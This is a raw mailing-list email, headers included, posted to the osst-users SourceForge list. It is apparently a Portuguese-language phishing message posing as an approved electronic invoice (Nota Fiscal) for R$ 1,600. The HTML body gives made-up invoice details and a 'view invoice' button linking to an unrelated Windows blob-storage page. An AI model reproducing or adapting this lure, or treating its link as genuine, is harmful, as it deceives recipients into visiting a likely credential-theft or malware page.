Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id CD17FC902B2
	for <lists+osst-users@lfdr.de>; Thu, 27 Nov 2025 21:56:51 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:To:
	Message-Id:Date:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
	:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=WaBOES3CUtA5k5Mva7sw20GBtdhU+WkbySbSE5fwWxg=; b=ZVX/shMrNiRRfTDek0Zkx7yPR1
	dUC5my3cgKU9t3IhXFwjl5XEHbNAeOFiGB3Njq2MlSC1ayrpd7Q9TiD5dVBabH6ic2EbXc+uvWM3E
	dGbDlfVfyjd8iFe0p7DllDgTukgohOVINPjpCNbFaiMA2SsTpijC2vuBQBUcoxgWfjcg=;
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1vOj2o-0007Ft-IW
	for lists+osst-users@lfdr.de;
	Thu, 27 Nov 2025 20:56:50 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <webmail1@yes28.financasglobaisonline.com>)
 id 1vOj2m-0007Ff-IY for osst-users@lists.sourceforge.net;
 Thu, 27 Nov 2025 20:56:48 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :To:Message-Id:Subject:Date:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=f60vhxpDzOOUUfq4rbdFrFIJHslidjrPj3UOdMTh2TI=; b=F/EEcdFrNytLR4pfHPc679oKWT
 SOTy4INsoBXPjQTRujN3fRvVqy4GDhZ8VdD8yPz/5HTsvksG9sRAYy1kkJjzCAtBMbtY7+pqzFBWR
 9AjlbDWaZ/wJy5Af8eu+qIYfqWWoWlhpq49vuRRMX8CDiT/q9gvKZpAZzTmS2Zv5DfHk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:To:Message-Id:Subject
 :Date:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=f60vhxpDzOOUUfq4rbdFrFIJHslidjrPj3UOdMTh2TI=; b=m
 nYOHPXSdtIBb2YpBMARq0QFdLmPqu81jAJnF/xRwf3jfrW2OJoJFkYSkbwlcA7aXGlCMaUp/+mIUo
 qZ44ykwIOnKHZcaGXyCfTz8uh7H4lVEMlFa9zv+0liEgev5m/6z+yjScFKlapcVp6lixZ7XZq0OXR
 l/nq690piTduB3ks=;
Received: from yes28.financasglobaisonline.com ([104.234.60.205])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1vOj2l-0000y3-Si for osst-users@lists.sourceforge.net;
 Thu, 27 Nov 2025 20:56:48 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
 d=yes28.financasglobaisonline.com; s=mail; t=1764276997;
 bh=TSvFR3+DeKGmn4tq4Tqis3f7zYzk7RQsQoJWgyU17VM=;
 h=From:Date:Subject:To:From;
 b=Vn1C5F7aOHBQzJpdCYTIIgySvedUGslGVY6Ym5s/ZROuERaoCpX6L76rIcJrRrTxc
 ysDtKWP+mTT7D+VAYPYkxfUzpXUW0hWzW4nCKX3kspXyY2/ddOL3A62KT/qlGv3r1F
 K7EGCWETjWOq/0eViBnrwsOAx4gYNrlvOEDFQ7mjVAh/NCtExbfO27p/cAV1Xe0b5Z
 Ds2Q4nU9ZHt++GhgwWrxrwswfRukA7yte7pKi8YrI7NBlLVju7BZlPPMMVKW+kmbev
 qfgDCK7RyYBG4PMkbn8IGl3u+Fs2FJAUnOZBX64O4PqBo8gr1FF3rvGkx8Fo8Au/xn
 W5/n/f0Z4353g==
From: Webmail <webmail1@yes28.financasglobaisonline.com>
Date: Thu, 27 Nov 2025 17:56:34 -0300
Message-Id: <A2FDIOB5URU4.R98ZKJ2HV1Z43@win-1abhnn8rn7s>
To: "osst-users@lists.sourceforge.net" <osst-users@lists.sourceforge.net>
MIME-Version: 1.0
X-Spam-Score: 0.9 (/)
X-Spam-Report: Spam detection software, running on the system "sfi-spamd-2.hosts.colo.sdot.me",
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  Nota Fiscal Eletrônica Olá, 
 
 Content analysis details:   (0.9 points, 5.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  1.0 RCVD_IN_UCE2           RBL: IP Subnet Listed in UCEPROTECT Level 2
                             [104.234.60.205 listed in dnsbl-2.uceprotect.net]
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
                             envelope-from domain
 -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from author's
                             domain
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.0 LOTS_OF_MONEY          Huge... sums of money
X-Headers-End: 1vOj2l-0000y3-Si
Subject: [Osst-users] Registro de nota fiscal recebido sem pendencias!
 Ref.285
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8733682280332848622=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============8733682280332848622==
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: 8bit

<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Nota Fiscal Eletrônica</title>
</head>
<body style="font-family: Arial, Helvetica, sans-serif; font-size: 14px; color: #333; line-height: 1.5;">

  <p>Olá,</p>

  <p>
    Segue a sua <strong>Nota Fiscal Eletrônica</strong> referente à recente compra realizada em nossa plataforma.
  </p>

  <p><strong>Dados do documento:</strong></p>
  <p>
    <strong>CNPJ:</strong> 39.050.566/0001-63<br>
    <strong>Status:</strong> Aprovado<br>
    <strong>Tipo de documento:</strong> NF-e<br>
    <strong>Valor total:</strong> R$ 1.600,00<br>
    <strong>Data da compra:</strong> 26/11/2025<br>
    <strong>Referência:</strong> Pedido #2096466034<br>
    <strong>Número da Nota Fiscal:</strong> 7890780829278454117<br>
    <strong>Data de emissão:</strong> 26/11/2025
  </p>

  <p>
    Para visualizar o documento completo, clique no link abaixo:
  </p>

  <p>
    <a href="https://renegotiation9863.blob.core.windows.net/bootstrap/remuneration.html"
       style="color:#1a73e8; text-decoration: underline; font-weight: bold;"
       target="_blank" rel="noopener noreferrer">
       Visualizar Nota Fiscal Eletrônica
    </a>
  </p>

  <p style="font-size: 12px; color: #666; margin-top: 20px;">
    Se você não reconhece esta solicitação ou tem qualquer dúvida, por favor desconsidere este e-mail
    e entre em contato com o nosso atendimento.
  </p>

</body>
</html>


--===============8733682280332848622==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8733682280332848622==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============8733682280332848622==--
